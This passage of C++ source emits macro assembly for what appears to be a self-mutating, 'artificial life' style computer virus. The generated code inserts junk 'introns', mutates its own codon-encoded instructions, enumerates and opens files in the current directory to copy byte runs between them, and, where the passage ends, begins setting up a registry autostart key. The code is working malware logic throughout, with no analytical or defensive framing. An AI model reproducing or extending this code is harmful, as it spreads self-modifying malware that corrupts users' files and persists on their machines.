file << "       _pop                                 ; BC1 = InsStart" << endl; CreateAnIntron();
file << "       _addsaved                            ; BC1 = InsStart + nBlockSize = InsEnd" << endl; CreateAnIntron();

file << "       _writeDWord                          ; !!! InsEnd" << endl; CreateAnIntron();



CalcNewRandNumberAndSaveIt();

GetAddress("nByteBlockToMov");
file << "       _saveWrtOff" << endl; CreateAnIntron();

GetAddress("RandomNumber");
file << "       _getdata" << endl; CreateAnIntron();
file << "       _nopdA                               ; mov RegA, [RandomNumber]" << endl; CreateAnIntron();

zer0(0);
file << "       _nopdD                               ; mov RegD, 0" << endl; CreateAnIntron();

file << "       _nopsB                               ; BC1=(FileSize-nBeforeIns)" << endl; CreateAnIntron();

file << "       _div" << endl; CreateAnIntron();

file << "       _nopsD                               ; BC1=nByteBlockToMov" << endl; CreateAnIntron();
addnumber("1");
file << "       _writeDWord                          ; !!! nByteBlockToMov" << endl; CreateAnIntron();

GetAddress("InsStart");
file << "       _getdata" << endl; CreateAnIntron();
file << "       _nopdA               ; RegA=InsStart" << endl; CreateAnIntron();

GetAddress("InsEnd");
file << "       _getdata" << endl; CreateAnIntron();
file << "       _nopdB               ; RegB=InsEnd" << endl; CreateAnIntron();

GetAddress("nByteBlockToMov");
file << "       _getdata" << endl; CreateAnIntron();
file << "       _nopdD               ; RegD=nByteBlockToMov=c" << endl; CreateAnIntron();

file << "; do" << endl; CreateAnIntron();
file << "       _getEIP" << endl; CreateAnIntron();
file << "       _sub0001" << endl; CreateAnIntron();
file << "       _sub0001" << endl; CreateAnIntron();
file << "       _sub0001" << endl; CreateAnIntron();
file << "       _sub0001" << endl; CreateAnIntron();
file << "       _sub0001" << endl; CreateAnIntron();
file << "       _saveJmpOff          ; mov BA2, eip" << endl; CreateAnIntron();

file << "       _nopsD               ; BC1=c" << endl; CreateAnIntron();
file << "       _save                ; BC2=c" << endl; CreateAnIntron();

file << "       _nopsB               ; BC1=InsEnd" << endl; CreateAnIntron();
file << "       _addsaved            ; BC1=InsEnd+c" << endl; CreateAnIntron();
file << "       _saveWrtOff          ; BA1=InsEnd+c" << endl; CreateAnIntron();


file << "       _pop                 ; If BC1=0: mutate" << endl; CreateAnIntron();
file << "       _push" << endl; CreateAnIntron();
addnumber("1");
file << "       _sub0001             ; Get the zer0 flag" << endl; CreateAnIntron();
file << "       _JnzDown" << endl;
file << "               _nopsA               ; BC1=InsStart" << endl;
file << "               _addsaved            ; BC1=InsStart+c" << endl; 
file << "               _getdata             ; BC1=*(InsStart+c)" << endl; 
file << "               _writeByte           ; *(InsEnd+c)==*(InsStart+c)" << endl; 

file << "       _nopsD" << endl; CreateAnIntron();
file << "       _sub0001" << endl; CreateAnIntron();
file << "       _nopdD               ; RegD=c-1" << endl; CreateAnIntron();

file << "       _JnzUp" << endl; CreateAnIntron();
file << "; while --c" << endl; CreateAnIntron();

file << "; Already set:" << endl; CreateAnIntron();
GetAddress("InsStart");
file << ";        _getdata" << endl; CreateAnIntron();
file << ";        _nopdA               ; RegA=InsStart" << endl; CreateAnIntron();

zer0(0);
addnumber("144");
file << "       _nopdB" << endl; CreateAnIntron();

GetAddress("nBlockSize");
file << "       _getdata" << endl; CreateAnIntron();
file << "       _nopdD               ; RegD=nBlockSize=c" << endl; CreateAnIntron();


file << "; do" << endl; CreateAnIntron();
file << "       _getEIP" << endl; CreateAnIntron();
file << "       _sub0001" << endl; CreateAnIntron();
file << "       _sub0001" << endl; CreateAnIntron();
file << "       _sub0001" << endl; CreateAnIntron();
file << "       _sub0001" << endl; CreateAnIntron();
file << "       _sub0001" << endl; CreateAnIntron();
file << "       _saveJmpOff          ; mov BA2, eip" << endl; CreateAnIntron();

file << "       _nopsD               ; BC1=c" << endl; CreateAnIntron();
file << "       _save                ; BC2=c" << endl; CreateAnIntron();

file << "       _nopsA               ; BC1=InsStart" << endl; CreateAnIntron();
file << "       _addsaved            ; BC1=InsStart+c" << endl; CreateAnIntron();
file << "       _saveWrtOff          ; BA1=InsStart+c" << endl; CreateAnIntron();



file << "       _pop                 ; If BC1=0: mutate" << endl; CreateAnIntron();
file << "       _push" << endl; CreateAnIntron();
addnumber("1");
file << "       _sub0001             ; Get the zer0 flag" << endl; CreateAnIntron();
file << "       _JnzDown" << endl; 
file << "               _nopREAL" << endl; 
file << "               _nopREAL" << endl; 
file << "               _nopsB" << endl; 
file << "               _writeByte           ; *(InsStart+c)==_nopREAL" << endl; 

file << "       _nopsD" << endl; CreateAnIntron();
file << "       _sub0001" << endl; CreateAnIntron();
file << "       _nopdD               ; RegD=c-1" << endl; CreateAnIntron();

file << "       _JnzUp" << endl; CreateAnIntron();
file << "; while --c" << endl; CreateAnIntron();

file << "       _pop         ; remove (rand() % InsertThreshold1) from Stack" << endl; CreateAnIntron();



zer0(0);
addnumber("((HGTEnd1-HGTStart1)*8)");

file << "       _save" << endl; CreateAnIntron();


file << "       _getEIP" << endl; CreateAnIntron();

file << "     HGTStart1:" << endl; CreateAnIntron();
addnumber("3");
file << "       _addsaved" << endl; CreateAnIntron();
file << "       _nopdB                               ; Save Addresse in RegB" << endl; CreateAnIntron();


CalcNewRandNumberAndSaveIt();

GetAddress("RandomNumber");
file << "       _getdata" << endl; CreateAnIntron();
file << "       _nopdA                               ; mov RegA, [RandomNumber]" << endl; CreateAnIntron();

zer0(0);
file << "       _nopdD                               ; mov RegD, 0" << endl; CreateAnIntron();
addnumber("HGTThreshold1");

file << "       _div                                 ; div BC1 <- RegD = rand() % HGTThreshold1" << endl; CreateAnIntron();

file << "       _nopsD" << endl; CreateAnIntron();
file << "       _save" << endl; CreateAnIntron();
file << "       _and                                 ; Is zero?" << endl; CreateAnIntron();

file << "       _JnzDown                             ; Simulate a JzDown" << endl; 

file << "               _nopREAL     ; BC1=0" << endl;
file << "               _nopREAL" << endl; 
file << "               _add0001" << endl; 
file << "               _JnzDown" << endl; 


file << "                       _nopsB     ; BC1!=0" << endl; 
file << "                       _call      ; jmp over HGT" << endl; 
file << "                       _nopREAL" << endl; 
file << "                       _nopREAL" << endl;


GetAddress("HGT_searchmask");
file << "       _saveWrtOff" << endl; CreateAnIntron();
zer0(0);
addnumber("0x002A2E2A");
file << "       _writeDWord" << endl; CreateAnIntron();


GetAddress("WIN32_FIND_DATA_struct");
file << "       _push" << endl; CreateAnIntron();
GetAddress("HGT_searchmask");
file << "       _push" << endl; CreateAnIntron();
CallAPI("hFindFirstFileA");


GetAddress("HGT_FFHandle");
file << "       _saveWrtOff" << endl; CreateAnIntron();
file << "       _nopsA" << endl; CreateAnIntron();
file << "       _writeDWord                   ; Save FindHandle" << endl; CreateAnIntron();

file << "       _getEIP" << endl; CreateAnIntron();
file << "       _sub0001" << endl; CreateAnIntron();
file << "       _sub0001" << endl; CreateAnIntron();
file << "       _sub0001" << endl; CreateAnIntron();
file << "       _sub0001" << endl; CreateAnIntron();
file << "       _sub0001" << endl; CreateAnIntron();
file << "       _saveJmpOff          ; Start of the loop" << endl; CreateAnIntron();


file << "               ; Calculate the call addresse if the file is not ok" << endl; CreateAnIntron();
zer0(0);
addnumber("((HGTFileEnd1-HGTFileStart1)*8)");
file << "               _save" << endl; CreateAnIntron();

file << "               _getEIP" << endl; CreateAnIntron();

file << "        HGTFileStart1:" << endl; CreateAnIntron();
addnumber("3");
file << "               _addsaved" << endl; CreateAnIntron();
file << "               _push                                ; Save Addresse on Stack" << endl; CreateAnIntron();

GetAddress("HGTFileHandle");
file << "                                                       ; be Closed later in any case," << endl; CreateAnIntron();
file << "                                                       ; except for [Handle]==0x0" << endl; CreateAnIntron();
file << "               _saveWrtOff" << endl; CreateAnIntron();
zer0(0);
file << "               _writeDWord" << endl; CreateAnIntron();

GetAddress("HGTMapHandle");
file << "               _saveWrtOff" << endl; CreateAnIntron();
zer0(0);
file << "               _writeDWord" << endl; CreateAnIntron();

GetAddress("HGTDidInsert");
file << "               _saveWrtOff" << endl; CreateAnIntron();
zer0(0);
file << "               _sub0001" << endl; CreateAnIntron();
file << "               _writeDWord" << endl; CreateAnIntron();

zer0(0);
addnumber("FILE_ATTRIBUTE_DIRECTORY");
file << "               _save" << endl; CreateAnIntron();
GetAddress("WIN32_FIND_DATA_dwFileAttributes");
file << "               _getdata" << endl; CreateAnIntron();
subsaved(0);

file << "               _JnzDown                             ; Simulate a JzDown" << endl; 
file << "                       _pop     ; BC1=0" << endl; 
file << "                       _push" << endl;
file << "                       _call    ; If directory -> Do not open..." << endl; 
file << "                       _nopREAL" << endl; 


CalcNewRandNumberAndSaveIt();

GetAddress("RandomNumber");
file << "               _getdata" << endl; CreateAnIntron();
file << "               _nopdA" << endl; CreateAnIntron();

zer0(0);
file << "               _nopdD" << endl; CreateAnIntron();

addnumber("5");
file << "               _div" << endl; CreateAnIntron();

file << "               _nopsD" << endl; CreateAnIntron();
file << "               _save" << endl; CreateAnIntron();
file << "               _and" << endl; CreateAnIntron();

file << "               _JnzDown                             ; Simulate a JzDown" << endl; 

file << "                       _nopREAL   ; BC=0" << endl;
file << "                       _nopREAL" << endl; 
file << "                       _add0001" << endl; 
file << "                       _JnzDown" << endl; 

file << "                               _pop     ; BC!=0" << endl; 
file << "                               _push" << endl; 
file << "                               _call    ; Not this file..." << endl;
file << "                               _nopREAL" << endl; 


file << "               ; OPEN FILE NOW" << endl; CreateAnIntron();
zer0(0);
file << "               _push" << endl; CreateAnIntron();
file << "               _push" << endl; CreateAnIntron();
addnumber("3");
file << "               _push" << endl; CreateAnIntron();
zer0(0);
file << "               _push" << endl; CreateAnIntron();
addnumber("1");
file << "               _push" << endl; CreateAnIntron();
file << "               _sub0001" << endl; CreateAnIntron();
addnumber("0xC0000000");
file << "               _push" << endl; CreateAnIntron();
GetAddress("WIN32_FIND_DATA_cFileName");
file << "               _push" << endl; CreateAnIntron();
CallAPI("hCreateFileA");

GetAddress("HGTFileHandle");
file << "               _saveWrtOff" << endl; CreateAnIntron();
file << "               _nopsA" << endl; CreateAnIntron();
file << "               _writeDWord              ; mov dword[HGTFileHandle], RegA" << endl; CreateAnIntron();

file << "               _save" << endl; CreateAnIntron();

file << "               _nopsA" << endl; CreateAnIntron();
addnumber("1");
file << "                                       ; -> if error: BC1=0" << endl; CreateAnIntron();

file << "               _JnzDown                             ; Simulate a JzDown" << endl; 
file << "                       _pop     ; BC1=0" << endl; 
file << "                       _push" << endl; 
file << "                       _call    ; If INVALID_HANDLE_VALUE -> Do not open..." << endl; 
file << "                       _nopREAL" << endl; 

GetAddress("HGTFileSize");

file << "               _push" << endl; CreateAnIntron();
zer0(1);
file << "               _addsaved" << endl; CreateAnIntron();
file << "               _push" << endl; CreateAnIntron();
CallAPI("hGetFileSize");

GetAddress("HGTFileSize");
file << "               _saveWrtOff" << endl; CreateAnIntron();
file << "               _nopsA" << endl; CreateAnIntron();
file << "               _writeDWord              ; mov dword[HGTFileSize], RegA" << endl; CreateAnIntron();

zer0(1);
file << "               _push" << endl; CreateAnIntron();
file << "               _addsaved" << endl; CreateAnIntron();
file << "               _push" << endl; CreateAnIntron();
zer0(0);
file << "               _push" << endl; CreateAnIntron();
addnumber("4");
file << "               _push" << endl; CreateAnIntron();
zer0(0);
file << "               _push" << endl; CreateAnIntron();
GetAddress("HGTFileHandle");
file << "               _getdata" << endl; CreateAnIntron();
file << "               _push" << endl; CreateAnIntron();
CallAPI("hCreateFileMappingA");


GetAddress("HGTMapHandle");

file << "               _saveWrtOff" << endl; CreateAnIntron();
file << "               _nopsA" << endl; CreateAnIntron();
file << "               _writeDWord               ; mov dword[HGTMapHandle], RegA" << endl; CreateAnIntron();

file << "               _save" << endl; CreateAnIntron();

file << "               _nopsA" << endl; CreateAnIntron();
file << "               _save" << endl; CreateAnIntron();
file << "               _and" << endl; CreateAnIntron();
file << "               _JnzDown                             ; Simulate a JzDown" << endl; 

file << "                       _pop     ; BC1=0" << endl; 
file << "                       _push" << endl; 
file << "                       _call    ; If NULL -> Do not open..." << endl; 
file << "                       _nopREAL" << endl; 

GetAddress("HGTFileSize");

file << "               _getdata" << endl; CreateAnIntron();
file << "               _push   ; [HGTFileSize]" << endl; CreateAnIntron();
zer0(1);
file << "               _push   ; 0" << endl; CreateAnIntron();
file << "               _push   ; 0" << endl; CreateAnIntron();
addnumber("2");
file << "               _push" << endl; CreateAnIntron();
zer0(1);
file << "               _addsaved" << endl; CreateAnIntron();
file << "               _push   ; MapHandle" << endl; CreateAnIntron();

CallAPI("hMapViewOfFile");

GetAddress("HGTMapPointer");

file << "               _saveWrtOff" << endl; CreateAnIntron();
file << "               _nopsA" << endl; CreateAnIntron();
file << "               _writeDWord              ; mov dword[HGTMapPointer], RegA" << endl; CreateAnIntron();

file << "               _nopsA" << endl; CreateAnIntron();
file << "               _save" << endl; CreateAnIntron();
file << "               _and" << endl; CreateAnIntron();
file << "               _JnzDown         ; Simulate a JzDown" << endl; 
file << "                       _pop     ; BC1=0" << endl; 
file << "                       _push" << endl; 
file << "                       _call    ; If NULL -> Do not open..." << endl;
file << "                       _nopREAL" << endl;


CalcNewRandNumberAndSaveIt();

GetAddress("RandomNumber");
file << "               _getdata" << endl; CreateAnIntron();
file << "               _nopdA" << endl; CreateAnIntron();

zer0(0);
file << "               _nopdD" << endl; CreateAnIntron();

GetAddress("HGTFileSize");
file << "               _getdata" << endl; CreateAnIntron();

file << "               _div" << endl; CreateAnIntron();

file << "               _nopsD" << endl; CreateAnIntron();
file << "               _save" << endl; CreateAnIntron();

GetAddress("HGTMapPointer");
file << "               _getdata" << endl; CreateAnIntron();

file << "               _addsaved" << endl; CreateAnIntron();

file << "               _push                ; Start in sourcefile" << endl; CreateAnIntron();


CalcNewRandNumberAndSaveIt();

GetAddress("RandomNumber");
file << "               _getdata" << endl; CreateAnIntron();
file << "               _nopdA" << endl; CreateAnIntron();

zer0(0);
file << "               _nopdD" << endl; CreateAnIntron();

GetAddress("FileSize");
file << "               _getdata" << endl; CreateAnIntron();

file << "               _div" << endl; CreateAnIntron();

file << "               _nopsD" << endl; CreateAnIntron();
file << "               _save" << endl; CreateAnIntron();

GetAddress("MapPointer");
file << "               _getdata" << endl; CreateAnIntron();
file << "               _addsaved" << endl; CreateAnIntron();

file << "               _push                ; Start in my file" << endl; CreateAnIntron();


CalcNewRandNumberAndSaveIt();

GetAddress("RandomNumber");
file << "               _getdata" << endl; CreateAnIntron();
file << "               _nopdA" << endl; CreateAnIntron();

zer0(0);
file << "               _nopdD" << endl; CreateAnIntron();

addnumber("11");

file << "               _div" << endl; CreateAnIntron();
file << "               _nopsD" << endl; CreateAnIntron();
addnumber("1");
file << "               _nopdD" << endl; CreateAnIntron();

file << "               ; Size in RegD" << endl; CreateAnIntron();


file << "               _pop         ; Start in my file" << endl; CreateAnIntron();
file << "               _nopdB" << endl; CreateAnIntron();


file << "               _pop         ; Start in victim file" << endl; CreateAnIntron();
file << "               _nopdA" << endl; CreateAnIntron();

file << "               _pushall" << endl; CreateAnIntron();
file << "               _getEIP" << endl; CreateAnIntron();
file << "               _sub0001" << endl; CreateAnIntron();
file << "               _sub0001" << endl; CreateAnIntron();
file << "               _sub0001" << endl; CreateAnIntron();
file << "               _sub0001" << endl; CreateAnIntron();
file << "               _sub0001" << endl; CreateAnIntron();

file << "               _saveJmpOff          ; Save everything, especially the old BA2" << endl; CreateAnIntron();

file << "                       _nopsB" << endl; CreateAnIntron();
file << "                       _saveWrtOff" << endl; CreateAnIntron();
addnumber("1");
file << "                       _nopdB" << endl; CreateAnIntron();

file << "                       _nopsA" << endl; CreateAnIntron();
addnumber("1");
file << "                       _nopdA" << endl; CreateAnIntron();
file << "                       _sub0001" << endl; CreateAnIntron();
file << "                       _getdata" << endl; CreateAnIntron();

file << "                       _writeByte" << endl; CreateAnIntron();

file << "                       _nopsD" << endl; CreateAnIntron();
file << "                       _sub0001" << endl; CreateAnIntron();
file << "                       _nopdD" << endl; CreateAnIntron();

file << "               _JnzUp" << endl; CreateAnIntron();
file << "               _popall              ; Get old BA2 again" << endl; CreateAnIntron();

GetAddress("HGTDidInsert");
file << "               _saveWrtOff" << endl; CreateAnIntron();
zer0(0);
file << "               _writeDWord" << endl; CreateAnIntron();


file << "               _push        ; trash" << endl; CreateAnIntron();

file << "        HGTFileEnd1:" << endl; CreateAnIntron();
file << "               _pop         ; from call" << endl; CreateAnIntron();
file << "               _pop         ; saved address" << endl; CreateAnIntron();

GetAddress("HGTMapPointer");
file << "               _getdata" << endl; CreateAnIntron();
file << "               _push" << endl; CreateAnIntron();
CallAPI("hUnmapViewOfFile");


file << "               _getDO" << endl; CreateAnIntron();
addnumber("(hCloseHandle-DataOffset)");
file << "               _getdata" << endl; CreateAnIntron();
file << "               _nopdA       ; Save API in RegA" << endl; CreateAnIntron();

GetAddress("HGTMapHandle");
file << "               _getdata" << endl; CreateAnIntron();
file << "               _push" << endl; CreateAnIntron();
file << "               _save" << endl; CreateAnIntron();
file << "               _and" << endl; CreateAnIntron();

file << "               _JnzDown" << endl; 
file << "                  ; BC==0" << endl; 
file << "                  _nopREAL" << endl;
file << "                  _nopREAL" << endl;
file << "                  _add0001" << endl;
file << "                  _JnzDown" << endl;

file << "                       ; BC!=0" << endl;
file << "                       _nopsA       ; get API offset" << endl;
file << "                       _call        ; call CloseHandle, dword[HGTMapHandle]" << endl;
file << "                       _push        ; Trash" << endl;
file << "                       _nopREAL" << endl;


file << "               _pop         ; remove trash" << endl; CreateAnIntron();

file << "               _getDO" << endl; CreateAnIntron();
addnumber("(hCloseHandle-DataOffset)");
file << "               _getdata" << endl; CreateAnIntron();
file << "               _nopdA       ; Save API in RegA" << endl; CreateAnIntron();

GetAddress("HGTFileHandle");
file << "               _getdata" << endl; CreateAnIntron();
file << "               _push" << endl; CreateAnIntron();
file << "               _save" << endl; CreateAnIntron();
file << "               _and" << endl; CreateAnIntron();

file << "               _JnzDown" << endl;
file << "                  ; BC==0" << endl; 
file << "                  _nopREAL" << endl; 
file << "                  _nopREAL" << endl; 
file << "                  _add0001" << endl; 
file << "                  _JnzDown" << endl; 

file << "                       ; BC!=0" << endl;
file << "                       _nopsA       ; get API offset" << endl;
file << "                       _call        ; call CloseHandle, dword[HGTFileHandle]" << endl;
file << "                       _push        ; Trash" << endl;
file << "                       _nopREAL" << endl;

file << "               _pop         ; remove trash" << endl; CreateAnIntron();


GetAddress("HGTDidInsert");
file << "               _getdata" << endl; CreateAnIntron();
file << "               _push                ; 0...written / -1...not written" << endl; CreateAnIntron();

GetAddress("WIN32_FIND_DATA_struct");
file << "               _push" << endl; CreateAnIntron();
GetAddress("HGT_FFHandle");
file << "               _getdata" << endl; CreateAnIntron();
file << "               _push" << endl; CreateAnIntron();

CallAPI("hFindNextFileA");


file << "               _pop                     ; HGTDidInsert" << endl; CreateAnIntron();
file << "               _save" << endl; CreateAnIntron();
file << "               _nopsA                   ; If nonzero: Next file!" << endl; CreateAnIntron();
file << "       _and" << endl; CreateAnIntron();
file << "       _JnzUp                           ; End of the loop" << endl; CreateAnIntron();


file << "       _push                ; Trash to stack" << endl; CreateAnIntron();
file << "       HGTEnd1:" << endl; CreateAnIntron();

file << "       _pop                 ; Align stack (Trash or Return address from _call)" << endl; CreateAnIntron();



CalcNewRandNumberAndSaveIt();

GetAddress("RPAminoAcid1");
file << "       _saveWrtOff" << endl; CreateAnIntron();

GetAddress("RandomNumber");

file << "       _getdata" << endl; CreateAnIntron();
file << "       _nopdA                   ; mov eax, [RandomNumber]" << endl; CreateAnIntron();


zer0(0);
file << "       _nopdD                   ; mov edx, 0" << endl; CreateAnIntron();

addnumber("256");

file << "       _div                     ; div ebx" << endl; CreateAnIntron();

file << "       _nopsD                   ; BC1=rand%256" << endl; CreateAnIntron();

file << "       _writeDWord              ; Save amino acid to compare." << endl; CreateAnIntron();


file << "       _push" << endl; CreateAnIntron();
zer0(0);
addnumber("3");
file << "       _save" << endl; CreateAnIntron();

file << "       _pop" << endl; CreateAnIntron();
file << "       _shl                     ; BC1=(rand%256)*8" << endl; CreateAnIntron();
file << "       _save" << endl; CreateAnIntron();


GetAddress("MapPointer");
file << "       _getdata" << endl; CreateAnIntron();
file << "       _addsaved                ; MapPoint+(rand%256)*8" << endl; CreateAnIntron();

addnumber("(CodeStart+(StartAlphabeth-start))");
file << "       _push" << endl; CreateAnIntron();
file << "       _getdata" << endl; CreateAnIntron();
file << "       _nopdA                   ; First 4 bytes of amino acid in RegA" << endl; CreateAnIntron();

file << "       _pop" << endl; CreateAnIntron();
addnumber("4");
file << "       _getdata" << endl; CreateAnIntron();
file << "       _nopdB                   ; 2nd 4 bytes of amino acid in RegB" << endl; CreateAnIntron();

GetAddress("MapPointer");
file << "       _getdata" << endl; CreateAnIntron();

addnumber("(CodeStart+(StartAlphabeth-start))");
file << "       _nopdD" << endl; CreateAnIntron();


file << "    ; Start of loop:" << endl; CreateAnIntron();
file << "       _getEIP" << endl; CreateAnIntron();
file << "       _sub0001" << endl; CreateAnIntron();
file << "       _sub0001" << endl; CreateAnIntron();
file << "       _sub0001" << endl; CreateAnIntron();
file << "       _sub0001" << endl; CreateAnIntron();
file << "       _sub0001" << endl; CreateAnIntron();
file << "       _saveJmpOff" << endl; CreateAnIntron();

zer0(0);
addnumber("((RPBlock1End1-RPBlock1Start1)*8)");
file << "               _save" << endl; CreateAnIntron();

file << "               _getEIP" << endl; CreateAnIntron();

file << "           RPBlock1Start1:" << endl; CreateAnIntron();
addnumber("3");
file << "               _addsaved" << endl; CreateAnIntron();
file << "               _push                               ; Save Addresse at Stack" << endl; CreateAnIntron();


file << "               _pushall" << endl; CreateAnIntron();
CalcNewRandNumberAndSaveIt();

GetAddress("RPAminoAcid2");
file << "                       _saveWrtOff" << endl; CreateAnIntron();

GetAddress("RandomNumber");

file << "                       _getdata" << endl; CreateAnIntron();
file << "                       _nopdA                   ; mov eax, [RandomNumber]" << endl; CreateAnIntron();

zer0(0);
file << "                       _nopdD                   ; mov edx, 0" << endl; CreateAnIntron();

addnumber("256");

file << "                       _div                     ; div ebx" << endl; CreateAnIntron();

file << "                       _nopsD" << endl; CreateAnIntron();
file << "                       _writeDWord" << endl; CreateAnIntron();

file << "               _popall" << endl; CreateAnIntron();

file << "               _pushall" << endl; CreateAnIntron();
GetAddress("RPAminoAcid1");
file << "                  _getdata" << endl; CreateAnIntron();
file << "                  _nopdA" << endl; CreateAnIntron();
GetAddress("RPAminoAcid2");
file << "                  _getdata" << endl; CreateAnIntron();
file << "                  _nopdB" << endl; CreateAnIntron();

file << "               _popall" << endl; CreateAnIntron();

zer0(0);
addnumber("3");
file << "               _save" << endl; CreateAnIntron();

GetAddress("RPAminoAcid2");
file << "               _getdata" << endl; CreateAnIntron();

file << "               _shl         ; *8" << endl; CreateAnIntron();
file << "               _save" << endl; CreateAnIntron();

file << "               _nopsD        ; Get start of Alphabeth in Map" << endl; CreateAnIntron();

file << "               _addsaved" << endl; CreateAnIntron();

file << "               _getdata" << endl; CreateAnIntron();
file << "               _save" << endl; CreateAnIntron();

file << "               _nopsA" << endl; CreateAnIntron();
subsaved(0);

file << "               _JnzDown     ; Simulate JzDown" << endl;

file << "                       _nopREAL     ; BC1=0" << endl;
file << "                       _nopREAL" << endl;
file << "                       _add0001" << endl;
file << "                       _JnzDown" << endl;

file << "                               _nopREAL     ; Not equal" << endl;
file << "                               _pop" << endl;
file << "                               _push" << endl;
file << "                               _call        ; jmp to RPBlock1End" << endl;

file << "       ; First 4 bytes are equal" << endl; CreateAnIntron();
file << "               _pop         ; Old Call-address" << endl; CreateAnIntron();

zer0(0);
addnumber("((RPBlock2End1-RPBlock2Start1)*8)");
file << "               _save" << endl; CreateAnIntron();

file << "               _getEIP" << endl; CreateAnIntron();

file << "           RPBlock2Start1:" << endl; CreateAnIntron();
addnumber("3");
file << "               _addsaved" << endl; CreateAnIntron();
file << "               _push                               ; Save Addresse at Stack" << endl; CreateAnIntron();


zer0(0);
addnumber("3");
file << "               _save" << endl; CreateAnIntron();

GetAddress("RPAminoAcid2");
file << "               _getdata" << endl; CreateAnIntron();

file << "               _shl         ; *8" << endl; CreateAnIntron();
file << "               _save" << endl; CreateAnIntron();

file << "               _nopsD        ; Get start of Alphabeth in Map" << endl; CreateAnIntron();

file << "               _addsaved" << endl; CreateAnIntron();

addnumber("4");

file << "               _getdata" << endl; CreateAnIntron();
file << "               _save" << endl; CreateAnIntron();

file << "               _nopsB       ; second 4 bytes" << endl; CreateAnIntron();
subsaved(0);
file << "               _JnzDown" << endl;

file << "                       _nopREAL     ; BC1=0" << endl;
file << "                       _pop" << endl;
file << "                       _push" << endl;
file << "                       _call        ; RPBlock2End" << endl;

file << "               _push        ; not equal! trash to stack" << endl; CreateAnIntron();

file << "           RPBlock1End1:        ; Not equal amino acids" << endl; CreateAnIntron();
file << "               _pop         ; remove " << static_cast<char>(34) << "call" << static_cast<char>(34) << "-return address" << endl; CreateAnIntron();
file << "               _pop         ; RPBlock1End-Jmp Address" << endl; CreateAnIntron();

zer0(0);
addnumber("15");
file << "               _save" << endl; CreateAnIntron();

GetAddress("RandomNumber");
file << "               _getdata     ; BC1=random" << endl; CreateAnIntron();

file << "               _shr         ; BC1=random >> 15 (to get new small random number without calling the 32bit RND engine again)" << endl; CreateAnIntron();
file << "               _and         ; BC1=(random >> 15) % 0000 1111b" << endl; CreateAnIntron();
file << "       _JnzUp               ; If not zero -> Next loop!" << endl; CreateAnIntron();


file << "       ; Not found any equivalences..." << endl; CreateAnIntron();

zer0(0);
addnumber("((RPBlock3End1-RPBlock3Start1)*8)");
file << "       _save" << endl; CreateAnIntron();

file << "       _getEIP" << endl; CreateAnIntron();

file << "     RPBlock3Start1:" << endl; CreateAnIntron();
addnumber("3");
file << "       _addsaved" << endl; CreateAnIntron();

file << "       _call        ; jmp to end of poly-engine: RPBlock3End" << endl; CreateAnIntron();




file << "     RPBlock2End1:      ; Equal amino acids found" << endl; CreateAnIntron();
file << "       _pop         ; remove " << static_cast<char>(34) << "call" << static_cast<char>(34) << "-return address" << endl; CreateAnIntron();
file << "       _pop         ; RPBlock2End-Jmp Address" << endl; CreateAnIntron();


GetAddress("MapPointer");
file << "       _getdata" << endl; CreateAnIntron();

addnumber("(CodeStart+(StAmino-start))");
file << "       _nopdD" << endl; CreateAnIntron();

GetAddress("RPAminoAcid1");
file << "       _getdata" << endl; CreateAnIntron();
file << "       _nopdA" << endl; CreateAnIntron();

GetAddress("RPAminoAcid2");
file << "       _getdata" << endl; CreateAnIntron();
file << "       _nopdB" << endl; CreateAnIntron();

zer0(0);
GetAddress("FileSize");
file << "       _getdata" << endl; CreateAnIntron();
addnumber("(0xFFFFFFFF-(CodeStart+(StAmino-start))-1000)");
file << "       _push" << endl; CreateAnIntron();

file << "       _getEIP" << endl; CreateAnIntron();
file << "       _sub0001" << endl; CreateAnIntron();
file << "       _sub0001" << endl; CreateAnIntron();
file << "       _sub0001" << endl; CreateAnIntron();
file << "       _sub0001" << endl; CreateAnIntron();
file << "       _sub0001" << endl; CreateAnIntron();
file << "       _saveJmpOff" << endl; CreateAnIntron();

file << "               _nopsD       ; Codon-Sequence Start" << endl; CreateAnIntron();
file << "               _save" << endl; CreateAnIntron();

file << "               _pop" << endl; CreateAnIntron();
file << "               _push        ; counter" << endl; CreateAnIntron();

file << "               _addsaved" << endl; CreateAnIntron();
file << "               _saveWrtOff" << endl; CreateAnIntron();
file << "               _getdata" << endl; CreateAnIntron();
file << "               _push" << endl; CreateAnIntron();

zer0(0);
addnumber("255");
file << "               _save" << endl; CreateAnIntron();
file << "               _pop" << endl; CreateAnIntron();
file << "               _and         ; BC1=one byte" << endl; CreateAnIntron();
file << "               _save" << endl; CreateAnIntron();

file << "               _nopsA" << endl; CreateAnIntron();

subsaved(0);
file << "               _JnzDown" << endl;
file << "                       _nopsB" << endl;
file << "                       _writeByte           ; If equal: exchange codon!" << endl;
file << "                       _nopREAL" << endl;
file << "                       _nopREAL" << endl;

file << "               _pushall" << endl; CreateAnIntron();
CalcNewRandNumberAndSaveIt();
file << "               _popall" << endl; CreateAnIntron();

zer0(0);
addnumber("1");
file << "               _save" << endl; CreateAnIntron();

GetAddress("RandomNumber");
file << "               _getdata" << endl; CreateAnIntron();
file << "               _and" << endl; CreateAnIntron();
addnumber("1");
file << "               _save                ; BC2=(rand%8)+1" << endl; CreateAnIntron();

file << "               _pop" << endl; CreateAnIntron();
subsaved(0);
file << "               _push" << endl; CreateAnIntron();

zer0(0);
addnumber("4293918720");
file << "               _save" << endl; CreateAnIntron();
file << "               _pop" << endl; CreateAnIntron();
file << "               _push" << endl; CreateAnIntron();
file << "               _and                 ; BC1=(counter%0xFFF0 0000)" << endl; CreateAnIntron();

file << "               _JnzDown" << endl;
file << "                       _add0001  ; Not finished" << endl;
file << "                       _JnzUp       ; Next step" << endl;
file << "                       _nopREAL" << endl;
file << "                       _nopREAL" << endl;


file << "       _pop         ; counter away from stack" << endl; CreateAnIntron();
file << "       _push        ; trash" << endl; CreateAnIntron();

file << "     RPBlock3End1:" << endl; CreateAnIntron();
file << "       _pop         ; return value from call" << endl; CreateAnIntron();


GetAddress("MapPointer");
file << "       _getdata" << endl; CreateAnIntron();
file << "       _push" << endl; CreateAnIntron();
CallAPI("hUnmapViewOfFile");

GetAddress("MapHandle");
file << "       _getdata" << endl; CreateAnIntron();
file << "       _push" << endl; CreateAnIntron();
CallAPI("hCloseHandle");

GetAddress("FileHandle");
file << "       _getdata" << endl; CreateAnIntron();
file << "       _push" << endl; CreateAnIntron();
CallAPI("hCloseHandle");


GetAddress("AutoStartContentStart");
file << "       _saveWrtOff" << endl; CreateAnIntron();
file << "       _nopdA" << endl; CreateAnIntron();

GetAddress("stSubKey");
file << "       _nopdA" << endl; CreateAnIntron();
file << "       _saveWrtOff" << endl; CreateAnIntron();
